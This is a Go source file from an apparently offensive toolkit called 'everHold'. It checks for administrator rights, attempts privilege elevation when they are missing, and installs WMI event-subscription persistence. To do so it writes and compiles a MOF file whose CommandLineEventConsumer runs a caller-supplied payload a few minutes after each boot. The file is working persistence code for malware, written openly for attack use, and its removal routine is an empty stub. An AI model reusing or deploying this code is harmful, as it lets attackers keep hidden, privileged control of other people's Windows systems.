package persist

import (
	"everHold/src/conf"
	"everHold/src/func/elevate"
	"everHold/src/tools"
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"time"
)

func Callmethod2(newcmd *conf.RUNCMD) {
	isAdmin, err := tools.IsUserAnAdmin()
	if err != nil {
		fmt.Println("Error:", err)
		return
	}
	if isAdmin == true {
		wmicMof(newcmd.PayloadValue, newcmd.AddValue, newcmd.NameValue)
	} else {
		tools.PrintError("权限不足，正在尝试提权...")
		uacLevel, err := tools.GetCurrentUACLevel()
		if err != nil {
			fmt.Println("Error:", err)
			return
		}
		if uacLevel == 0 {
			elevate.Runasadmin(newcmd)
		}

	}
	//这里需要判断进行提权

}

func wmicMof(payload string, add bool, name string) {
	if add == true {
		mofTemplate := fmt.Sprintf(`#PRAGMA AUTORECOVER
#PRAGMA NAMESPACE ("\\\\.\\root\\subscription")

instance of __EventFilter as $Filt
{
	Name = "%s";
	Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 200 AND TargetInstance.SystemUpTime < 360";
	QueryLanguage = "WQL";    
	EventNamespace = "root\\cimv2";
};

instance of CommandLineEventConsumer as $Cons
{
	Name = "%s";
	RunInteractively=false;
	CommandLineTemplate="%s";
};

instance of __FilterToConsumerBinding
{
	Filter = $Filt;
	Consumer = $Cons;
};`, name, name, payload)

		// Write MOF template to disk
		mofPath := filepath.Join(os.TempDir(), name+".mof")
		mofFile, err := os.Create(mofPath)
		if err != nil {
			tools.PrintError("Cannot proceed, unable to create mof file on disk " + mofPath + "\n")
			return
		}
		defer mofFile.Close()

		_, err = mofFile.WriteString(mofTemplate)
		if err != nil {
			tools.PrintError("Cannot proceed, unable to write mof file to disk " + mofPath + "\n")
			return
		}

		tools.PrintSuccess("Successfully wrote mof template to disk " + mofPath + "\n")
		time.Sleep(5 * time.Second)

		// Disable file system redirection
		tools.PrintInfo("Disabling file system redirection")
		exitCode := runCmd("cmd", "/C", "disable_fsr.bat")
		if exitCode != 0 {
			tools.PrintError("Failed to disable file system redirection")
			return
		}
		tools.PrintSuccess("Successfully disabled file system redirection")

		// Compile MOF file
		exitCode = runCmd("mofcomp.exe", mofPath)
		if exitCode == 0 {
			tools.PrintSuccess("Successfully compiled mof file containing our payload " + payload + "\n")
			tools.PrintSuccess("Successfully installed persistence, payload will execute after boot")
		} else {
			tools.PrintError("Unable to compile mof file containing our payload " + payload + "\n")
		}

		// Cleanup
		time.Sleep(5 * time.Second)
		tools.PrintInfo("Cleaning up")
	} else {
		//删除逻辑
		tools.PrintInfo("正在删除...")
	}
}

func runCmd(command string, args ...string) int {
	cmd := exec.Command(command, args...)
	cmd.Stdout = os.Stdout
	cmd.Stderr = os.Stderr
	err := cmd.Run()
	if err != nil {
		return 1
	}
	return 0
}
